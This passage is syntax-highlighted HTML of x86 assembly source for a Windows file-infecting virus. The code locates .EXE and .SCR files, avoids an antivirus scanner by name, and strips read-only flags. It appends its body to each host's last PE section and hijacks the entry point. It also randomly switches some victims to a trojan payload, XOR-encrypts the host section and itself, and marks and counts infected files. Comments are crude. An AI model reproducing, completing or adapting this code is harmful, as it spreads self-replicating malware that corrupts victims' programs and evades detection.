                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REPNZ</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Get last DWORD of filename.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_EAX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">             </span><span class="sc1">; Standard .EXE-file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Check_Filename</span><span class="sc0">

</span><span class="sc5">Go_Find_Next_F</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'RCS.'</span><span class="sc0">             </span><span class="sc1">; Screensaver-file?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Find_Next_File</span><span class="sc0">

</span><span class="sc5">Check_Filename</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Get 1st DWORD of filename.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Upcase_EAX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NACS'</span><span class="sc0">             </span><span class="sc1">; Don't infect McFuck SCAN,</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Go_Find_Next_F</span><span class="sc0">          </span><span class="sc1">; (most overused Windoze AV).</span><span class="sc0">

</span><span class="sc5">Save_File_Attr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">GetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc1">; Clear the readonly-flag.</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">FILE_ATTRIBUTE_READONLY</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">SetFileAttributesA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">                     </span><span class="sc1">; Open the file.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">CreateFileA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Restore_Attr</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">File_Handle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; Save the host's time/date of creation,</span><span class="sc0">
                </span><span class="sc1">; last access, and last write.</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Victim_Last_Write_Time</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">GetFileTime</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">GetFileSize</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Host_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">

                </span><span class="sc1">; Like, allocate memory for the mapped file, or</span><span class="sc0">
                </span><span class="sc1">; whatever the fuck this shit is neccesary for.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">CreateFileMappingA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_File</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc1">; This should map the file in our</span><span class="sc0">
                </span><span class="sc1">; allocated memory, am I not right???</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">                     </span><span class="sc1">; WHOLE file.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">MapViewOfFile</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Error?</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">Close_Mapping</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EAX.EXE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">    </span><span class="sc1">; File must be .EXE-type.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Unmap_File</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EAX.Reloc_Table</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">  </span><span class="sc1">; It has a NE/PE-header?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">Unmap_File</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Obtain pointer to PE-header.</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDI = PE-header.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDI.PE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">     </span><span class="sc1">; Make sure it's a PE-file.</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Unmap_File</span><span class="sc0">

                </span><span class="sc1">; A bit redundant, I guess...</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDI.CPU_Type</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">14Ch</span><span class="sc0">    </span><span class="sc1">; This PE is for 386+'s ?</span><span class="sc0">
                </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Unmap_File</span><span class="sc0">

                </span><span class="sc1">; === Avoid DLL's. ===</span><span class="sc0">

                </span><span class="sc6">TEST</span><span class="sc0">    </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.PE_Flags</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Unmap_File</span><span class="sc0">

                </span><span class="sc1">; === Did we already infect it before? ===</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDI.Reserved_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Unmap_File</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; EBX = Mapping-address.</span><span class="sc0">

                </span><span class="sc1">; === Get last section-header. ===</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.Number_Of_Sections</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">                </span><span class="sc1">; EDX = PE-header.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDX.Headers_Size</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">                </span><span class="sc1">; EBP = Last section-header.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_Start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_Size_Raw</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Offset of virus in file.</span><span class="sc0">

                </span><span class="sc6">PUSHAD</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">         </span><span class="sc1">; Copy virus to mapped file.</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">POPAD</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">         </span><span class="sc1">; Set new size of host.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Host_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">EDX.Entry_Point</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Old_EIP</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc1">; Calculate virus' new EIP RVA.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_RVA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_Size_Raw</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDX.Entry_Point</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">  </span><span class="sc1">; Set our new entrypoint.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Virus_RVA</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Get a random value in AL.</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">AND</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111100b</span><span class="sc0">           </span><span class="sc1">; Trojanize this victim?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Skip_Trojanize</span><span class="sc0">

                </span><span class="sc1">; Patch JMP to let it point to the trojan-code.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Payload_Switch</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

</span><span class="sc5">Skip_Trojanize</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_Size_Raw</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_Size_Virtual</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">; Always pick the smallest size.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">                </span><span class="sc1">; The other one is smaller?</span><span class="sc0">
                </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">Not_Bigger</span><span class="sc0">              </span><span class="sc1">; No, leave things this way.</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">                </span><span class="sc1">; Else use the smaller size.</span><span class="sc0">

</span><span class="sc5">Not_Bigger</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Section_Size</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBP.Section_Size_Virtual</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EBP.Section_Size_Raw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDX.Image_Size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">

        </span><span class="sc1">; Set object-flags: code, executable, readable, and writable.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">EBP.Section_Flags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11100000000000000000000000100000b</span><span class="sc0">

                </span><span class="sc6">JECXZ</span><span class="sc0">   </span><span class="sc5">Encrypt_Virus</span><span class="sc0">           </span><span class="sc1">; Don't let LOOP overflow.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EBP.Section_Start</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">EBP.Section_RVA</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">RVA_Encrypted</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

                </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Get random keys.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Init_K_Section</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Slide_K_Section</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

</span><span class="sc5">Encr_Section</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; Encrypt host's last section.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encr_Section</span><span class="sc0">

</span><span class="sc5">Encrypt_Virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">IN</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                 </span><span class="sc1">; Get a random value in AX.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Initial_Key</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">+(</span><span class="sc5">Sliding_Key</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Encrypted</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc4">-</span><span class="sc5">Encrypted</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Encrypt_Byte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">               </span><span class="sc1">; Encrypt virusbody.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc0">

                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">Encrypt_Byte</span><span class="sc0">

                </span><span class="sc1">; Mark this host as being infected.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">EDX.Reserved_1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">

                </span><span class="sc1">; We succesfully infected yet another file.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">Infect_Counter</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Unmap_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">UnmapViewOfFile</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Close_Mapping</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">+(</span><span class="sc5">CloseHandle</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc4">)]</span><span class="sc0">

</span><span class="sc5">Close_File</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">
